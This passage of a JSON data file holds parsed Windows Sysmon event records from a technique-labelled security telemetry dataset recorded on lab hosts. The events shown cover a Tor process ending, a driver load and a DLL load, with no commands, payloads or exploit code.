        "EventData": {
          "UtcTime": "2021-09-29 07:41:15.922",
          "State": "Started",
          "Version": "13.01",
          "SchemaVersion": "4.50"
        }
      }
    },
    "5": {
      "event_id": "5",
      "length": 992,
      "source_file": "datasets\\attack_techniques\\T1090.003\\windows_tor_client_execution\\windows-sysmon.log",
      "event_index_in_file": 49,
      "raw": "<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>5</EventID><Version>3</Version><Level>4</Level><Task>5</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2026-01-20T02:20:46.8820690Z'/><EventRecordID>807</EventRecordID><Correlation/><Execution ProcessID='9452' ThreadID='3804'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>DESKTOP-39DIRD1</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2026-01-20 02:20:46.875</Data><Data Name='ProcessGuid'>{09d8803c-e661-696e-3d05-000000000f00}</Data><Data Name='ProcessId'>5516</Data><Data Name='Image'>C:\\Users\\Admin\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\cpoalefficncklhjfpglfiplenlpccdb\\1.0.39\\tor-0.4.8.19-win32-brave-0</Data><Data Name='User'>DESKTOP-39DIRD1\\Admin</Data></EventData></Event>",
      "parsed": {
        "SourceName": "Microsoft-Windows-Sysmon",
        "EventCode": "5",
        "Timestamp": "2026-01-20T02:20:46.8820690Z",
        "LogName": "Microsoft-Windows-Sysmon/Operational",
        "ComputerName": "DESKTOP-39DIRD1",
        "System": {
          "Provider": {
            "Name": "Microsoft-Windows-Sysmon",
            "Guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"
          },
          "EventID": "5",
          "Version": "3",
          "Level": "4",
          "Task": "5",
          "Opcode": "0",
          "Keywords": "0x8000000000000000",
          "TimeCreated": {
            "SystemTime": "2026-01-20T02:20:46.8820690Z"
          },
          "EventRecordID": "807",
          "Correlation": "",
          "Execution": {
            "ProcessID": "9452",
            "ThreadID": "3804"
          },
          "Channel": "Microsoft-Windows-Sysmon/Operational",
          "Computer": "DESKTOP-39DIRD1",
          "Security": {
            "UserID": "S-1-5-18"
          }
        },
        "EventData": {
          "RuleName": "-",
          "UtcTime": "2026-01-20 02:20:46.875",
          "ProcessGuid": "{09d8803c-e661-696e-3d05-000000000f00}",
          "ProcessId": "5516",
          "Image": "C:\\Users\\Admin\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\cpoalefficncklhjfpglfiplenlpccdb\\1.0.39\\tor-0.4.8.19-win32-brave-0",
          "User": "DESKTOP-39DIRD1\\Admin"
        }
      }
    },
    "6": {
      "event_id": "6",
      "length": 1146,
      "source_file": "datasets\\attack_techniques\\T1014\\windows-sysmon.log",
      "event_index_in_file": 192,
      "raw": "<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385F-C22A-43E0-BF4C-06F5698FFBD9}'/><EventID>6</EventID><Version>4</Version><Level>4</Level><Task>6</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2022-03-29T17:38:17.397221100Z'/><EventRecordID>5704</EventRecordID><Correlation/><Execution ProcessID='340' ThreadID='3116'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>win-dc-mhaag-attack-range-702.attackrange.local</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2022-03-29 17:38:17.393</Data><Data Name='ImageLoaded'>C:\\Program Files\\SplunkUniversalForwarder\\etc\\apps\\Splunk_TA_stream\\windows_x86_64\\bin\\npf.sys</Data><Data Name='Hashes'>MD5=DE7FCC77F4A503AF4CA6A47D49B3713D,SHA256=4BFAA99393F635CD05D91A64DE73EDB5639412C129E049F0FE34F88517A10FC6,IMPHASH=CB86059F4B291991E735BECBD4C669CB</Data><Data Name='Signed'>true</Data><Data Name='Signature'>Riverbed Technology, Inc.</Data><Data Name='SignatureStatus'>Valid</Data></EventData></Event>",
      "parsed": {
        "SourceName": "Microsoft-Windows-Sysmon",
        "EventCode": "6",
        "Timestamp": "2022-03-29T17:38:17.397221100Z",
        "LogName": "Microsoft-Windows-Sysmon/Operational",
        "ComputerName": "win-dc-mhaag-attack-range-702.attackrange.local",
        "System": {
          "Provider": {
            "Name": "Microsoft-Windows-Sysmon",
            "Guid": "{5770385F-C22A-43E0-BF4C-06F5698FFBD9}"
          },
          "EventID": "6",
          "Version": "4",
          "Level": "4",
          "Task": "6",
          "Opcode": "0",
          "Keywords": "0x8000000000000000",
          "TimeCreated": {
            "SystemTime": "2022-03-29T17:38:17.397221100Z"
          },
          "EventRecordID": "5704",
          "Correlation": "",
          "Execution": {
            "ProcessID": "340",
            "ThreadID": "3116"
          },
          "Channel": "Microsoft-Windows-Sysmon/Operational",
          "Computer": "win-dc-mhaag-attack-range-702.attackrange.local",
          "Security": {
            "UserID": "S-1-5-18"
          }
        },
        "EventData": {
          "RuleName": "-",
          "UtcTime": "2022-03-29 17:38:17.393",
          "ImageLoaded": "C:\\Program Files\\SplunkUniversalForwarder\\etc\\apps\\Splunk_TA_stream\\windows_x86_64\\bin\\npf.sys",
          "Hashes": "MD5=DE7FCC77F4A503AF4CA6A47D49B3713D,SHA256=4BFAA99393F635CD05D91A64DE73EDB5639412C129E049F0FE34F88517A10FC6,IMPHASH=CB86059F4B291991E735BECBD4C669CB",
          "Signed": "true",
          "Signature": "Riverbed Technology, Inc.",
          "SignatureStatus": "Valid"
        }
      }
    },
    "7": {
      "event_id": "7",
      "length": 1793,
      "source_file": "datasets\\attack_techniques\\T1547.012\\printnightmare\\mimikatz-windows-sysmon.log",
      "event_index_in_file": 22983,
      "raw": "<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385F-C22A-43E0-BF4C-06F5698FFBD9}'/><EventID>7</EventID><Version>3</Version><Level>4</Level><Task>7</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2021-07-09T14:59:36.243803600Z'/><EventRecordID>24355</EventRecordID><Correlation/><Execution ProcessID='1224' ThreadID='3140'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>win-dc-58.attackrange.local</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2021-07-09 14:59:36.238</Data><Data Name='ProcessGuid'>{C2350C16-6458-60E8-B303-00000000CF01}</Data><Data Name='ProcessId'>7088</Data><Data Name='Image'>C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\mscorsvw.exe</Data><Data Name='ImageLoaded'>C:\\Windows\\Microsoft.NET\\assembly\\GAC_MSIL\\Microsoft.RightsManagementServices.ServerManager.DeploymentPlugin\\v4.0_10.0.0.0__31bf3856ad364e35\\Microsoft.RightsManagementServices.ServerManager.DeploymentPlugin.dll</Data><Data Name='FileVersion'>10.0.14393.4046</Data><Data Name='Description'>Microsoft.RightsManagementServices.ServerManager.DeploymentPlugin</Data><Data Name='Product'>Microsoft (R) Windows (R) Operating System</Data><Data Name='Company'>Microsoft Corporation</Data><Data Name='OriginalFileName'>Microsoft.RightsManagementServices.ServerManager.DeploymentPlugin.dll</Data><Data Name='Hashes'>MD5=03433F05AFDFAE029841C214027DE71C,SHA256=B33349C9F488C06CF572CDA7713FC3FBF69DD063E19A1411BC4C1C77F56B4273,IMPHASH=DAE02F32A21E03CE65412F6E56942DAA</Data><Data Name='Signed'>true</Data><Data Name='Signature'>Microsoft Windows</Data><Data Name='SignatureStatus'>Valid</Data></EventData></Event>",
